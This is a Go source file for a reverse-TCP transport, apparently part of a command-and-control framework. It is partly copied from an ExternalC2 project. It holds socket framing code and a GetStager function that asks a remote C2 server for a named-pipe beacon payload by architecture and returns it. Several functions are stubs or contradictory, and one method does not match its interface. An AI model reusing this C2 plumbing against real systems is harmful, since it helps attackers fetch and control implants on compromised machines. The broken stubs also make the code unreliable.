package revtcptransport

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"net"
)

type TransportInfo struct {
	Name        string
	Author      string
	Description string
	Version     string
}

type Transport interface {
	Info() TransportInfo
}

func connectToCs() string {
	// TODO
	log.Println("Something went wrong")
	return "ok"
}

func Send(CmdChannel chan []byte) error {
	// TODO
	return nil
}

func Recv(CmdChannel chan []byte) ([]byte, error) {
	// TODO
	return nil, nil
}

// shameless rip from https://github.com/ryhanson/ExternalC2/blob/master/go-external-c2/channels/socket_channel.go
type IC2Connector interface {
	Started() bool
	BeaconChannel() IC2Channel
	ServerChannel() IC2Channel
	Initialize() bool
	Go()
	Stop()
}

type IC2Channel interface {
	Connect() error
	IsConnected() bool
	Close()
	ReadFrame() ([]byte, int, error)
	SendFrame(buffer []byte) (int, error)
	ReadAndSendTo(c2 IC2Channel)
	GetStager(pipeName string, is64Bit bool, taskWaitTime int) ([]byte, error)
}

type SocketChannel struct {
	Addr   string
	Socket net.Conn
}

// Create socket using specified IP and port[]
func NewSocket(addr string) (*SocketChannel, error) {
	return &SocketChannel{Addr: addr}, nil
}

// Create inital connection to external listener
func (s *SocketChannel) Connect() error {
	socket, err := net.Dial("tcp", s.Addr)
	if err != nil {
		return err
	}
	s.Socket = socket
	return nil
}

// Read frame reads a frame from the server socket
func (s *SocketChannel) ReadFrame() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	_, err := s.Socket.Read(sizeBytes)
	if err != nil {
		return nil, 0, err
	}
	size := binary.LittleEndian.Uint32(sizeBytes)
	if size > 1024*1024 {
		size = 1024 * 1024
	}
	var total uint32
	buff := make([]byte, size)
	for total < size {
		read, err := s.Socket.Read(buff[total:])
		if err != nil {
			return nil, int(total), err
		}
		total += uint32(read)
	}
	if size > 1 && size < 1024 {
		log.Printf("[+] Read frame: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	return buff, int(total), nil
}

// Send frame sends a frame to the server socket
func (s *SocketChannel) SendFrame(buff []byte) (int, error) {
	length := len(buff)
	if length > 2 && length < 1024 {
		log.Printf("[+] Sending frame: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
	_, err := s.Socket.Write(sizeBytes)
	if err != nil {
		return 0, err
	}
	x, err := s.Socket.Write(buff)
	return x + 4, err
}

// ReadAndSendTo reads a fromae from the socket and sends it to the beacon channel
func (s *SocketChannel) ReadAndSendTo(c2Channel IC2Channel) (bool, error) {
	buff, _, err := s.ReadFrame()
	if err != nil {
		return false, err
	}
	if len(buff) < 0 {
		return false, nil
	}
	_, err = c2Channel.SendFrame(buff)
	if err != nil {
		return false, err
	}
	return true, nil
}

// Close the connection
func (s *SocketChannel) Close() {
	s.Socket.Close()
}

// Terminate the socket Connection
func (s *SocketChannel) Terminate() {
	s.Close()
}

// IsConnected returns true if the underlying socket has a connection
func (s *SocketChannel) IsConnected() bool {
	return s.Socket != nil
}

// Get staget requests a namedpipe beacon from the server
func (s *SocketChannel) GetStager(pipeName string, is64Bit bool, taskWaitTime int) ([]byte, error) {
	if is64Bit {
		s.SendFrame([]byte("arch=x64"))
	} else {
		s.SendFrame([]byte("arch=x86"))
	}
	s.SendFrame([]byte("pipename=" + pipeName))
	s.SendFrame([]byte(fmt.Sprintf("block=%d", taskWaitTime)))
	s.SendFrame([]byte("go"))
	stager, _, err := s.ReadFrame()
	return stager, err
}
